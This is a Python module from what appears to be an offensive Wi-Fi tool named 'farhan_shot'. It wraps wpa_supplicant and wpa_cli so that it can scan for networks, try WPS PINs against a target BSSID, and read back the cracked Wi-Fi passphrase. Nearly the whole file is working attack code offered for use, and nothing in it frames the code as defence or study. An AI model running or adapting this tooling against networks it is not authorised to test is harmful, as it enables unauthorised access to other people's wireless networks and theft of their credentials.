"""WPA Supplicant controller for WPS attacks without monitor mode"""
import subprocess
import logging
import re
import time
from typing import Optional, Dict
from pathlib import Path

logger = logging.getLogger("farhan_shot.wpa")


class WPASupplicantController:
    """Control wpa_supplicant for WPS attacks"""
    
    def __init__(self, interface: str):
        """Initialize WPA supplicant controller
        
        Args:
            interface: WiFi interface name
        """
        self.interface = interface
        self.conf_file = Path("/tmp/wpa_supplicant_farhan.conf")
        self.pid_file = Path(f"/tmp/wpa_supplicant_{interface}.pid")
        self.ctrl_interface = Path("/var/run/wpa_supplicant")
        self.running = False
    
    def start(self) -> bool:
        """Start wpa_supplicant
        
        Returns:
            True if started successfully, False otherwise
        """
        if self.is_running():
            logger.info("wpa_supplicant is already running")
            return True
        
        # Create minimal config file
        self._create_config()
        
        try:
            # Start wpa_supplicant
            cmd = [
                'wpa_supplicant',
                '-B',  # Background
                '-i', self.interface,
                '-c', str(self.conf_file),
                '-D', 'nl80211',  # Driver
                '-P', str(self.pid_file)
            ]
            
            logger.debug(f"Starting wpa_supplicant: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                logger.error(f"Failed to start wpa_supplicant: {result.stderr}")
                return False
            
            # Wait a bit for it to start
            time.sleep(1)
            
            self.running = self.is_running()
            if self.running:
                logger.info("wpa_supplicant started successfully")
            
            return self.running
        
        except FileNotFoundError:
            logger.error("wpa_supplicant not found. Please install: sudo apt install wpasupplicant")
            return False
        except Exception as e:
            logger.error(f"Failed to start wpa_supplicant: {e}")
            return False
    
    def stop(self) -> bool:
        """Stop wpa_supplicant
        
        Returns:
            True if stopped successfully
        """
        if not self.is_running():
            return True
        
        try:
            if self.pid_file.exists():
                with open(self.pid_file, 'r') as f:
                    pid = f.read().strip()
                
                subprocess.run(['kill', pid], check=False)
                time.sleep(0.5)
                
                if self.pid_file.exists():
                    self.pid_file.unlink()
            
            self.running = False
            logger.info("wpa_supplicant stopped")
            return True
        
        except Exception as e:
            logger.error(f"Failed to stop wpa_supplicant: {e}")
            return False
    
    def is_running(self) -> bool:
        """Check if wpa_supplicant is running
        
        Returns:
            True if running, False otherwise
        """
        try:
            result = subprocess.run(
                ['pgrep', '-f', f'wpa_supplicant.*{self.interface}'],
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False
    
    def _create_config(self):
        """Create wpa_supplicant configuration file"""
        config = f"""ctrl_interface={self.ctrl_interface}
ctrl_interface_group=0
update_config=1
ap_scan=1
"""
        
        try:
            self.conf_file.write_text(config)
            logger.debug(f"Created config file: {self.conf_file}")
        except Exception as e:
            logger.error(f"Failed to create config file: {e}")
    
    def wps_pin_attack(self, bssid: str, pin: str, timeout: int = 30) -> Optional[str]:
        """Attempt WPS PIN attack
        
        Args:
            bssid: Target BSSID
            pin: WPS PIN to try
            timeout: Attack timeout in seconds
            
        Returns:
            Password if successful, None otherwise
        """
        try:
            # Use wpa_cli to attempt WPS PIN connection
            cmd = ['wpa_cli', '-i', self.interface, 'wps_reg', bssid, pin]
            
            logger.debug(f"Trying PIN {pin} on {bssid}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            if 'OK' in result.stdout:
                # Wait for connection
                time.sleep(5)
                
                # Check if we got the password
                password = self._get_password()
                if password:
                    logger.info(f"Successfully cracked! Password: {password}")
                    return password
            
            return None
        
        except subprocess.TimeoutExpired:
            logger.debug(f"PIN attack timed out after {timeout}s")
            return None
        except Exception as e:
            logger.error(f"WPS PIN attack failed: {e}")
            return None
    
    def _get_password(self) -> Optional[str]:
        """Get password from wpa_supplicant status
        
        Returns:
            Password if found, None otherwise
        """
        try:
            result = subprocess.run(
                ['wpa_cli', '-i', self.interface, 'status'],
                capture_output=True,
                text=True
            )
            
            # Look for psk or passphrase in output
            for line in result.stdout.split('\n'):
                if 'psk=' in line or 'passphrase=' in line:
                    return line.split('=')[1].strip()
            
            return None
        except:
            return None
    
    def scan_networks(self) -> list:
        """Trigger network scan
        
        Returns:
            List of networks (simplified)
        """
        try:
            # Trigger scan
            subprocess.run(['wpa_cli', '-i', self.interface, 'scan'], check=False)
            time.sleep(3)
            
            # Get scan results
            result = subprocess.run(
                ['wpa_cli', '-i', self.interface, 'scan_results'],
                capture_output=True,
                text=True
            )
            
            networks = []
            for line in result.stdout.split('\n')[1:]:  # Skip header
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 5:
                        networks.append({
                            'bssid': parts[0],
                            'frequency': parts[1],
                            'signal': parts[2],
                            'flags': parts[3],
                            'ssid': ' '.join(parts[4:])
                        })
            
            return networks
        
        except Exception as e:
            logger.error(f"Network scan failed: {e}")
            return []
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if self.conf_file.exists():
                self.conf_file.unlink()
            if self.pid_file.exists():
                self.pid_file.unlink()
        except:
            pass
